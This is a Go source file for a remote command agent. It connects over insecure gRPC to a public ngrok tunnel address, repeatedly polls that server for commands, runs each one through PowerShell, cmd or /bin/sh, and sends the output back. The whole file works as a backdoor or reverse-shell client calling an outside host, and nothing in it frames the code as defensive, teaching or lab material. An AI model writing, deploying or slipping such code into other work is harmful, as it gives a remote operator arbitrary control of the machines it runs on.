package main

import (
	"context"
	"log"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"github.com/cardfaux/windows-connect/grpcapi"
	"google.golang.org/grpc"
)

func getCommandForShell(shell string, command string) *exec.Cmd {
	switch strings.ToLower(shell) {
	case "powershell":
		return exec.Command("powershell", "-Command", command)
	case "cmd":
		return exec.Command("cmd", "/C", command)
	case "sh":
		return exec.Command("/bin/sh", "-c", command)
	default:
		// Fallback based on OS
		if runtime.GOOS == "windows" {
			return exec.Command("cmd", "/C", command)
		}
		return exec.Command("/bin/sh", "-c", command)
	}
}

func main() {
	conn, err := grpc.Dial("0.tcp.ngrok.io:11048", grpc.WithInsecure())
	if err != nil {
		log.Fatalf("Failed to connect to server: %v", err)
	}
	defer conn.Close()

	client := grpcapi.NewEchoServiceClient(conn)
	log.Println("Connected to command server.")

	for {
		// Poll the server
		resp, err := client.ExecuteCommand(context.Background(), &grpcapi.CommandRequest{
			Command: "GET_COMMAND",
		})
		if err != nil {
			log.Printf("Polling error: %v", err)
			time.Sleep(5 * time.Second)
			continue
		}

		command := resp.Output
		if command == "" {
			time.Sleep(5 * time.Second)
			continue
		}

		// Assume the server sent "SHELL: actual_command" (e.g., "powershell: Get-Process")
		parts := strings.SplitN(command, ":", 2)
		var shell, actualCommand string
		if len(parts) == 2 {
			shell = strings.TrimSpace(parts[0])
			actualCommand = strings.TrimSpace(parts[1])
		} else {
			shell = "" // Use default
			actualCommand = command
		}

		log.Printf("Executing command with shell [%s]: %s", shell, actualCommand)
		cmd := getCommandForShell(shell, actualCommand)

		output, err := cmd.CombinedOutput()
		if err != nil {
			log.Printf("Execution error: %v", err)
		}

		_, err = client.ExecuteCommand(context.Background(), &grpcapi.CommandRequest{
			Command: string(output),
		})
		if err != nil {
			log.Printf("Failed to send output: %v", err)
		} else {
			log.Println("Output sent to server.")
		}

		time.Sleep(5 * time.Second)
	}
}